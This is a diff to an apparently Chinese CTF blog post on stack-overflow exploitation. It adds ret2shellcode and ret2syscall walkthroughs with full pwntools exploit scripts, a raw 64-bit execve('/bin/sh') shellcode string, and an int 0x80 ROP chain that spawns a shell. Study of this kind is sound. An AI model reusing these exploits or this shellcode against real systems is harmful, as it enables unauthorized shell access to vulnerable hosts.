@@ -238,8 +238,38 @@
 <p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。 </p>
 </blockquote>
 <p> 在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。 </p>
-<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191123100725859.png" alt="image-20191123100725859"></p>
-<h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><ul>
+<p>我们打开题目</p>
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103134449648.png" alt="image-20200103134449648"></p>
+<p>可以看到有两条<code>puts</code>输出语句，还有两条<code>fgets</code>获取输入</p>
+<p>其中<code>name</code>是在<code>bss</code>段，<code>s</code>是在栈上，那么我们可以把<code>Shellcode</code>写在<code>bss</code>段，然后构造栈溢出让<code>EIP</code>去<code>bss</code>段执行。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'xxxxxxxxx'</span>,xxxx)</span><br><span class="line">bss_addr = <span class="number">0x0804A080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">r.recvuntil(<span class="string">'Name:'</span>)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">payload =p32(bss_addr)*<span class="number">0x100</span></span><br><span class="line">r.recvuntil(<span class="string">'message:'</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103134842157.png" alt="image-20200103134842157"></p>
+<h3 id="ret2shellcode-64"><a href="#ret2shellcode-64" class="headerlink" title="ret2shellcode_64"></a>ret2shellcode_64</h3><p>原理相同</p>
+<p>shellcode：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode =  <span class="string">'\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="ret2sys-32"><a href="#ret2sys-32" class="headerlink" title="ret2sys_32"></a>ret2sys_32</h3><p>打开题目</p>
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103140958469.png" alt="image-20200103140958469"></p>
+<p>这里应该存在溢出，来调试一下</p>
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103141132291.png" alt="image-20200103141132291"></p>
+<p>44个字节直接覆盖到了eip，那么我们来找一下gadget</p>
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103141455130.png" alt="image-20200103141455130"></p>
+<p>三处连续<code>pop | ret</code></p>
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103141537333.png" alt="image-20200103141537333"></p>
+<p>找到<code>int 0x80 ret</code></p>
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103141636321.png" alt="image-20200103141636321"></p>
+<p>现在的问题是，我们没有<code>/bin/sh</code>字符串，那么我们可以利用系统调用的方式来构造一个<code>read</code>先去写在程序的<code>bss</code>段一个<code>/bin/sh</code></p>
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103141936952.png" alt="image-20200103141936952"></p>
+<p>那么我们现在的问题就是要去堆这个<code>ROP</code>链，去先<code>read</code>到<code>sh</code>进<code>bss</code>段里面，然后去调用<code>execve</code></p>
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103142306241.png" alt="image-20200103142306241"></p>
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103142343011.png" alt="image-20200103142343011"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">'xxx'</span>,xxxx)</span><br><span class="line">int_0x80 = <span class="number">0x0806F350</span></span><br><span class="line">pop_eax = <span class="number">0x080bb2c6</span></span><br><span class="line">pop_ebx_ecx_edx = <span class="number">0x0806ecb0</span></span><br><span class="line">buf = <span class="number">0x080EAF80</span></span><br><span class="line">payload = <span class="string">'A'</span>*(<span class="number">0x28</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += flat([pop_eax,<span class="number">0x03</span>,pop_ebx_ecx_edx,<span class="number">50</span>,buf,<span class="number">1</span>,int_0x80,pop_eax,<span class="number">0xb</span>,pop_ebx_ecx_edx,<span class="number">0</span>,<span class="number">0</span>,buf,int_0x80])</span><br><span class="line">sh.recvuntil(<span class="string">'system?'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103142445144.png" alt="image-20200103142445144"></p>
+<h3 id="ret2sys-64"><a href="#ret2sys-64" class="headerlink" title="ret2sys_64"></a>ret2sys_64</h3><h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><ul>
 <li><p>ncat</p>
 <ul>
 <li>建立local service环境</li>
